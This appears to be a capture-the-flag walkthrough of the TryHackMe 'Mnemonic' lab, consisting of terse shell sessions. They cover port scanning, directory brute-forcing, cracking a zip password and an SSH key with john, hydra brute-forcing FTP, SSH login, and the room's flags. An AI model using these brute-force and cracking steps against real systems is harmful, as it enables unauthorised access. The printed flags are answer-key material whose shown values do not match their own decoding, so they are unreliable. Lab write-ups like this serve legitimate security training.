...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ sudo nmap -p- -sS -sC -sV -O 10.10.236.110
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ gobuster dir -u http://10.10.236.110/webmasters/ -x php,txt,bak,old -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ gobuster dir -u http://10.10.236.110/webmasters/backups/ -x php,txt,bak,old,tar,zip,gz -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ zip2john backups.zip > backups.hash
...
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ john backups.hash --wordlist=/usr/share/wordlists/rockyou.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password:
  inflating: backups/note.txt
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ cat backups/note.txt
@vill

James new ftp username: ftpuser
we have to work hard
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.236.110
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ ftp 10.10.236.110
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ cat not.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ john id_rsa.hash  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ ssh james@10.10.236.110 -p 1337
...
```
bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ cd /opt/
bibo318@parrot:/opt$ sudo git clone https://github.com/MustafaTanguner/Mnemonic.git
[sudo] password for kali:
...
bibo318@parrot:/opt$ python3 -m pip install --user colored
Collecting colored
...
bibo318@parrot:/opt$ python3 -m pip install --user opencv-python
...
bibo318@parrot:/opt$ cd Mnemonic/
bibo318@parrot:/opt/Mnemonic$ python3 Mnemonic.py
...
```
bibo318@parrot:/opt/Mnemonic$ echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
THM{V0N318*****a5f82a00e2feee3465249b855be71c01}
```
...
THM{V0N318*****congratulationsyoumadeithashme}

bibo318@parrot:~/CTFs/tryhackme/Mnemonic$ echo -n "congratulationsyoumadeithashme" | md5sum
2a4825f50b0c16636984b448669b0586  -

THM{V0N318*****2a4825f50b0c16636984b448669b0586}
```
